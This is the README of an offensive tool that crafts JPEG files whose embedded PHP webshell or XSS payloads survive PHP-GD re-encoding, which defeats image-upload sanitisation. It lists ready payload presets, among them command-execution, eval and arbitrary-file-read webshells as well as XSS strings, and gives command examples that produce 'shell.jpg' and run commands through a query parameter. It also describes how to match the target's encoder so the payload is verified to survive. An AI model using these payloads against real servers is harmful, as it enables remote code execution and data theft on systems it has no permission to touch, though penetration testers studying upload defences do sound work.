###### jpg_payload.php (v1.0)

## About

A tool that builds a JPEG carrying a chosen payload (PHP or XSS) so that it
**survives re-encoding by PHP-GD** (`imagecreatefromjpeg()` → optional
`imagecopyresampled()`/`imagecopyresized()` → `imagejpeg()`). Useful when testing
image-upload features where the application "sanitizes" files by re-encoding them.

Improved fork of the original `jpg_payload.php` by Sergey Bobrov (@Black2Fan).
Unlike the original (which injected the payload at the start of the scan data, which
on modern libjpeg practically never survives the conversion), this version
**searches offsets in the scan stream and verifies every candidate**, so it actually
produces working files.

## Features

  - Injects a payload into the JPEG so it survives PHP-GD re-encoding.
  - Ready-made PHP and XSS presets (`phpinfo`, `system`, `eval`, `read`, `src`,
    `xss`, ...) plus any custom payload (`-p`) or one read from a file (`-f`).
  - Verifies every candidate automatically — the payload must actually survive the
    simulated conversion and be the only `<?` tag in the file.
  - `--analyze` — profiles a file produced by the target (dimensions, quality,
    baseline/progressive mode, subsampling, libjpeg version) and prints ready commands.
  - `--oracle` — verify with the target's own encoder instead of the local libjpeg
    (required when the libjpeg versions differ, e.g. target v80 vs local v62).
  - Quality auto-detection, base-image generation (`--gen`), wall-clock budget.

## Requirements

  - PHP 8.x with the GD extension.
  - (Optional) `cjpeg`/`djpeg` or a PHP-GD container for `--oracle` mode.

## Usage

```
$ php jpg_payload.php -h

jpg_payload.php - craft a JPEG whose payload survives PHP-GD re-encoding.

Usage: php jpg_payload.php [options] <base.jpg>
       php jpg_payload.php [options] --gen WxH

Options:
  -p, --payload <preset|string>  payload (default: phpinfo). Presets:
      phpinfo  (14 B)  <?=phpinfo()?>
      system   (15 B)  <?=`$_GET[0]`?>
      eval     (19 B)  <?=eval($_GET[0])?>
      read     (23 B)  <?=readfile($_GET[0])?>
      src      (29 B)  <?=highlight_file($_GET[0])?>
      xss      (21 B)  <svg onload=alert(1)>
      xss-img  (28 B)  <img src=x onerror=alert(1)>
      xss-dom  (35 B)  <svg onload=alert(document.domain)>

  -f, --payload-file <file>      read the raw payload from a file
  -o, --output <file>            output path (default: payload_<base name>)
  -q, --quality <1-100>          quality the TARGET uses (default: auto-detect)
      --sim <resample|direct|both>
                                 conversion to simulate (default: resample)
      --analyze <processed.jpg>  inspect a JPEG the TARGET produced and print the
                                 exact oracle + generate commands, then exit
      --gen <WxH>                generate base images instead of supplying one
      --oracle <cmd>             verify with the TARGET's own encoder instead of
                                 the local libjpeg (reads a JPEG from {in}/stdin,
                                 writes the converted JPEG to {out}/stdout)
      --rounds <n>               survive n successive conversions (default 1)
      --max-pad <n>              max NUL padding after the payload (default 12)
      --step <n>                 offset step while scanning the scan data (default 1)
      --budget <sec>             wall-clock search budget (default 60)
  -v, --verbose
  -h, --help

Tip: the payload must contain NO 0xFF byte, and the shorter it is the better.
```

## Examples

```
# phpinfo() from a generated base image
php jpg_payload.php --gen 128x128 -p phpinfo -q 98 -o shell.jpg

# Most reliable: use an image ALREADY processed by the target (size + quality match)
php jpg_payload.php -p system target_processed.jpg        # then: ?0=<cmd>

# Fingerprint the target encoder and get ready-made commands
php jpg_payload.php --analyze target_processed.jpg -p eval

# Verify with the target's encoder (when the target's libjpeg != local)
php jpg_payload.php target_processed.jpg -p '<?=eval($_GET[0])?>' \
    --oracle ./oracle.sh --budget 500 -o payload.jpg

# XSS
php jpg_payload.php --gen 160x160 -p xss -q 98 -o xss.jpg
```

## How it works (short)

The payload is spliced into the Huffman-coded scan stream at various offsets. When
the image is re-encoded at the same quality and size, a block that round-trips
through quantization unchanged re-emits the same bytes — including the payload. The
tool searches for such a **fixed point** and only accepts a verified result. Key
point: the payload must be a fixed point of the **target's** encoder — hence
`--oracle` when the libjpeg version differs.

## Building a matching oracle

An oracle is a command that reproduces the target's conversion: it reads a JPEG from
STDIN and writes the converted JPEG to STDOUT. The tool uses it to verify candidates
with **the same encoder the target uses** — necessary when the target's libjpeg
version differs from your local one.

Read the target's parameters off a sample processed by the target:

```
php jpg_payload.php --analyze target_processed.jpg
```

The bundled `oracle.sh` is a template based on `cjpeg`/`djpeg` (libjpeg-turbo). Tune
it with environment variables to match the `--analyze` output:

```
# target: quality 90, progressive, 4:4:4
QUALITY=90 SAMPLE=1x1 PROGR=1 ./oracle.sh < in.jpg > out.jpg

# if the target's libjpeg version != local, point at your own cjpeg/djpeg build
DJPEG=./v8/djpeg CJPEG=./v8/cjpeg QUALITY=90 ./oracle.sh < in.jpg > out.jpg
```

Alternatively, the oracle can be a PHP-GD container matching the target (same
libjpeg) that decodes and re-encodes the image:

```
--oracle 'docker run --rm -i php:8-alpine php -r \
  '\''$i=imagecreatefromstring(stream_get_contents(STDIN));imagejpeg($i,null,90);'\'''
```

Using the finished oracle:

```
php jpg_payload.php target_processed.jpg -p '<?=eval($_GET[0])?>' \
    --oracle './oracle.sh' --budget 500 -o payload.jpg
```
